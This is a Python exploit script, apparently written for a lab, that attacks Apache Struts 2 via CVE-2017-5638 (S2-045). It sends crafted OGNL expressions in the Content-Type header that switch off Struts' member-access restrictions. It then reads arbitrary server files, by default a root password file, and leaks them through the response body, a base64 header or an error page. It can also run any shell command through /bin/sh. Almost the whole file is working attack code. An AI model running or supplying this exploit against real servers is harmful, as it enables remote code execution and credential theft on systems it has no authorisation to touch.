#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
etapa1b_s2045.py -- CVE-2017-5638 (S2-045) / Struts 2.3.30
Cliente HTTP em nivel de socket. Diferenca chave: preserva os bytes recebidos
ANTES do RST, que o urllib descarta via IncompleteRead/ConnectionResetError.

  python3 etapa1b_s2045.py --url http://10.0.1.10:8080/ --mode ladder
  python3 etapa1b_s2045.py --url http://10.0.1.10:8080/ --mode file --file /root/senhas_servidores.txt
  python3 etapa1b_s2045.py --url http://10.0.1.10:8080/ --mode cmd --cmd 'id; ls -l /root'
"""
import argparse
import os
import socket
import ssl
import sys
import time

BOUND = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
MBODY = (("--%s\r\n" % BOUND).encode()
         + b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
         + b"Content-Type: text/plain\r\n\r\nlab\r\n"
         + ("--%s--\r\n" % BOUND).encode())


# ------------------------------------------------------------------ socket ---
def recv_all(sock, timeout):
    """Le ate EOF, timeout ou RST. Devolve (bytes_acumulados, erro_ou_None)."""
    chunks, err = [], None
    sock.settimeout(timeout)
    while True:
        try:
            b = sock.recv(65536)
        except (ConnectionResetError, ConnectionAbortedError) as e:
            err = "reset: %s" % e
            break
        except socket.timeout:
            err = "timeout"
            break
        except OSError as e:
            err = "oserror: %s" % e
            break
        if not b:
            break
        chunks.append(b)
    return b"".join(chunks), err


def dechunk(b):
    out, i = b"", 0
    while True:
        j = b.find(b"\r\n", i)
        if j == -1:
            break
        try:
            n = int(b[i:j].split(b";")[0], 16)
        except ValueError:
            break
        if n == 0:
            break
        out += b[j + 2:j + 2 + n]
        i = j + 2 + n + 2
    return out if out else b   # fallback: corpo truncado no meio do chunk


def parse_resp(raw):
    head, _, body = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = lines[0].decode("latin-1") if lines else ""
    hdrs = {}
    for ln in lines[1:]:
        k, _, v = ln.partition(b":")
        hdrs[k.decode("latin-1").strip().lower()] = v.decode("latin-1").strip()
    if "chunked" in hdrs.get("transfer-encoding", "").lower():
        body = dechunk(body)
    elif "content-length" in hdrs:
        try:
            body = body[:int(hdrs["content-length"])]
        except ValueError:
            pass
    return status, hdrs, body


def http_post(host, port, path, ctype, timeout=20.0, tls=False):
    t0 = time.time()
    req = ("POST %s HTTP/1.1\r\n"
           "Host: %s:%d\r\n"
           "Content-Type: %s\r\n"
           "Content-Length: %d\r\n"
           "Connection: close\r\n"
           "Accept: */*\r\n"
           "User-Agent: s2045-lab/1\r\n\r\n"
           % (path, host, port, ctype, len(MBODY))).encode("latin-1")
    res = {"status": "", "hdrs": {}, "body": b"", "raw": b"",
           "err": None, "bytes": 0, "dt": 0.0, "send_err": None}
    try:
        s = socket.create_connection((host, port), timeout)
    except OSError as e:
        res["err"] = "connect: %s" % e
        res["dt"] = time.time() - t0
        return res
    try:
        if tls:
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
        try:
            s.sendall(req + MBODY)
        except OSError as e:
            res["send_err"] = str(e)   # o servidor pode ter resetado antes do fim
        raw, err = recv_all(s, timeout)
    finally:
        try:
            s.close()
        except OSError:
            pass
    res["raw"], res["err"] = raw, err
    res["bytes"] = len(raw)
    res["status"], res["hdrs"], res["body"] = parse_resp(raw)
    res["dt"] = time.time() - t0
    return res


# ------------------------------------------------------------------ payloads -
def q(v):
    return v.replace("\\", "\\\\").replace("'", "\\'")


# restaura o MemberAccess padrao do OGNL (contorna excludedPackageNames/excludedClasses)
BYPASS = ("(#_='multipart/form-data')"
          ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
          ".(#_memberAccess?(#_memberAccess=#dm):"
          "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
          ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
          ".(#ognlUtil.getExcludedPackageNames().clear())"
          ".(#ognlUtil.getExcludedClasses().clear())"
          ".(#context.setMemberAccess(#dm))))")


def P(extra):
    return "%{" + BYPASS + extra + "}"


def resp():
    return "@org.apache.struts2.ServletActionContext@getResponse()"


def v_trivial():          # L1: so testa se o %{...} e avaliado (sem bypass)
    return "%{'S2045PROBE'}"


def v_noop():             # L2: bypass + nada
    return P(".(#x=1)")


def v_writer_marker():    # L3: bypass + escrita minima no response
    return P(".(#o=%s.getWriter()).(#o.print('S2045WRITER')).(#o.flush())" % resp())


def v_file_writer(p):     # L4a: java.nio -> getWriter()
    return P(".(#f=new java.io.File('%s'))" % q(p)
             + ".(#t=new java.lang.String("
               "@java.nio.file.Files@readAllBytes(#f.toPath()),'UTF-8'))"
             + ".(#o=%s.getWriter()).(#o.print(#t)).(#o.flush())" % resp())


def v_file_header(p):     # L4b: conteudo em header de resposta (base64)
    return P(".(#f=new java.io.File('%s'))" % q(p)
             + ".(#b=@java.util.Base64@getEncoder().encodeToString("
               "@java.nio.file.Files@readAllBytes(#f.toPath())))"
             + ".(%s.setHeader('X-S2045',#b))" % resp())


def v_file_exc(p):        # L4c: conteudo na mensagem da excecao (error page)
    return P(".(#f=new java.io.File('%s'))" % q(p)
             + ".(#t=new java.lang.String("
               "@java.nio.file.Files@readAllBytes(#f.toPath()),'UTF-8'))"
             + ".(@java.lang.Integer@parseInt('S2045'+'>>'+#t))")


def v_cmd_writer(c):      # L5a: ProcessBuilder -> getWriter()
    return P(".(#c='%s')" % q(c)
             + ".(#pb=new java.lang.ProcessBuilder({'/bin/sh','-c',#c}))"
             + ".(#pb.redirectErrorStream(true)).(#p=#pb.start())"
             + ".(#o=%s.getWriter())" % resp()
             + ".(#o.print(@org.apache.commons.io.IOUtils@toString(#p.getInputStream())))"
             + ".(#o.flush())")


def v_cmd_stream(c):      # L5b: ProcessBuilder -> getOutputStream() (classico)
    return P(".(#c='%s')" % q(c)
             + ".(#pb=new java.lang.ProcessBuilder({'/bin/sh','-c',#c}))"
             + ".(#pb.redirectErrorStream(true)).(#p=#pb.start())"
             + ".(#os=%s.getOutputStream())" % resp()
             + ".(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#os))"
             + ".(#os.flush())")


# -------------------------------------------------------------------- main ---
def run(tag, host, port, path, ctype, opts, baseline=b""):
    res = http_post(host, port, path, ctype, opts.timeout, opts.tls)
    if opts.dump:
        os.makedirs(opts.dump, exist_ok=True)
        fn = os.path.join(opts.dump, "%02d_%s.raw" % (opts.seq, tag.replace("/", "_")))
        with open(fn, "wb") as fh:
            fh.write(res["raw"])
    opts.seq += 1

    if res["bytes"] == 0:
        verdict = "SEM-DADOS (%s)" % (res["err"] or res.get("send_err") or "eof")
    elif res["err"]:
        verdict = "PARCIAL+RST"
    elif res["body"] and res["body"] != baseline:
        verdict = "DADOS"
    else:
        verdict = "VAZIO"

    print("[%s] %-18s %-16s %-24s %6d B  %-22s %5.2fs"
          % (tag[:2], tag, path, (res["status"] or "-")[:24],
             res["bytes"], verdict, res["dt"]))
    if opts.show_err and res["err"]:
        print("      ! %s" % res["err"])

    body = res["body"].decode("utf-8", "replace")
    if opts.body and body:
        print("      --- corpo ---")
        for ln in body.splitlines()[:opts.maxlines]:
            print("      | " + ln[:300])
        print("      -------------")
    hx = res["hdrs"].get("x-s2045")
    if hx:
        import base64 as _b
        try:
            print("      [X-S2045] " + _b.b64decode(hx).decode("utf-8", "replace"))
        except Exception:                                   # noqa: BLE001
            print("      [X-S2045] (b64 invalido) " + hx[:120])
    return res


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://10.0.1.10:8080/")
    ap.add_argument("--mode", choices=["ladder", "file", "cmd"], default="ladder")
    ap.add_argument("--path", action="append", default=None)
    ap.add_argument("--file", default="/root/senhas_servidores.txt")
    ap.add_argument("--cmd", default="id; uname -a")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--body", action="store_true", help="imprime o corpo")
    ap.add_argument("--show-err", action="store_true", default=True)
    ap.add_argument("--maxlines", type=int, default=40)
    ap.add_argument("--dump", default="etapa1b_raw")
    a = ap.parse_args()
    a.seq = 0

    from urllib.parse import urlsplit
    u = urlsplit(a.url if "://" in a.url else "http://" + a.url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 8080)
    a.tls = a.tls or u.scheme == "https"
    base = u.path or "/"
    paths = a.path or [base] + [p for p in ("/", "/index.action") if p != base]

    print("alvo %s:%d | paths=%s | modo=%s" % (host, port, paths, a.mode))

    for path in paths:
        print("\n=== %s ===" % path)
        rs = run("baseline", host, port, path,
                 "multipart/form-data; boundary=%s" % BOUND, a, b"")
        baseline = rs["body"]

        if a.mode == "ladder":
            steps = [("L1-trivial", v_trivial()),
                     ("L2-noop", v_noop()),
                     ("L3-writer", v_writer_marker()),
                     ("L4-file-w", v_file_writer(a.file)),
                     ("L4-file-h", v_file_header(a.file)),
                     ("L4-file-x", v_file_exc(a.file)),
                     ("L5-cmd-w", v_cmd_writer('id'))]
            for tag, ct in steps:
                run(tag, host, port, path, ct, a, baseline)

        elif a.mode == "file":
            for tag, fn in (("R-writer", v_file_writer),
                            ("R-header", v_file_header),
                            ("R-exc", v_file_exc)):
                r = run(tag, host, port, path, fn(a.file), a, baseline)
                if r["body"] and r["body"] != baseline:
                    break

        else:
            for tag, fn in (("C-writer", v_cmd_writer),
                            ("C-stream", v_cmd_stream)):
                r = run(tag, host, port, path, fn(a.cmd), a, baseline)
                if r["body"] and r["body"] != baseline:
                    break
    return 0


if __name__ == "__main__":
    sys.exit(main())
